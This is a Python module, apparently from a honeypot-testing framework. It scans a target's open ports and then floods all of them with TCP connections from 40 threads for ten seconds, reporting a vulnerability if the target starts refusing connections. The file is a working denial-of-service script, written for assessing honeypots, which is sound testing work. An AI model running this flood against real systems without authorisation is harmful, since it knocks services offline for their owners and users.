import socket
import threading
import time

from .base_attack import BaseAttack, AttackResults, BaseHoneypot
from .honeypot_port_scanner.honeypot_port_scanner import (HoneypotPortScanner,
                                                          PortList)


class DoSAllOpenPorts(BaseAttack):
    def __init__(self, honeypot: BaseHoneypot) -> None:
        """
        Initializes a new DoSAllOpenPorts object.

        Args:
            honeypot (BaseHoneypot): Honeypot object to get the information
                                     for performing the DoS on the honeypot.
        """
        super().__init__(honeypot)
        self.honeypot_ports: list[int] = []
        self.honeypot_rejecting_connections: bool = False

    def run_HoneypotPortScanner(self):
        """
        Run the HoneypotPortScanner to get the open ports of the honeypot.
        """
        honeypot_scanner = HoneypotPortScanner(self.honeypot.ip)
        honeypot_scanner.run_scanner()
        self.honeypot_ports = honeypot_scanner.get_open_ports()

    def attack(self, stop_event) -> None:
        """
        Attempt to flood the honeypot with connections in all ports, until it
        starts rejecting them.

        TODO: Add how many connections it took to get to the rejecting
              state as a return value
        """
        try:
            while not self.honeypot_rejecting_connections and not stop_event.is_set():
                for port in self.honeypot_ports:
                    port = int(port)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    try:
                        print(f"Connecting to {self.honeypot.ip}:{port}...")
                        sock.connect((self.honeypot.ip, port))
                    except Exception as e:
                        print(f"Exception occurred: {e}")
                        self.honeypot_rejecting_connections = True
                        break
                    finally:
                        sock.close()
                time.sleep(0.01)
        except Exception as ex:
            print(f"Exception in thread: {ex}")

    def run_attack(self, num_threads: int = 40) -> AttackResults:
        """
        Launch the DoS attack using multiple threads.

        Args:
            num_threads (int | Optional): The number of threads to use for
                                          the attack.

        Returns:
            AttackResults: The results of the attack.
        """
        print("Running the nmap scanner...")
        self.run_HoneypotPortScanner()
        print(f"Running DoS attack on {self.honeypot.ip} and ports: {self.honeypot_ports}...")
        self.honeypot_rejecting_connections = False
        stop_event = threading.Event()  # Event to signal threads to stop

        threads: list[threading.Thread] = [threading.Thread(target=self.attack,
                                                            args=(stop_event,))
                                           for _ in range(num_threads)]

        start_time: float = time.time()

        for thread in threads:
            thread.start()

        # Wait for a certain duration or until the event is set
        time.sleep(10)  # Adjust the duration as needed
        stop_event.set()  # Signal threads to stop

        for thread in threads:
            thread.join()

        end_time: float = time.time()
        time_taken: float = end_time - start_time
        # TODO: Add how many connections it took to get to the rejecting state

        # Check if honeypot successfully rejected connections
        if self.honeypot_rejecting_connections:
            return (True,
                    "Vulnerability found: DoS attack made the honeypot reject connections",
                    time_taken,
                    num_threads)
        else:
            return (False,
                    "Honeypot did not reject connections, attack unsuccessful",
                    time_taken,
                    num_threads)
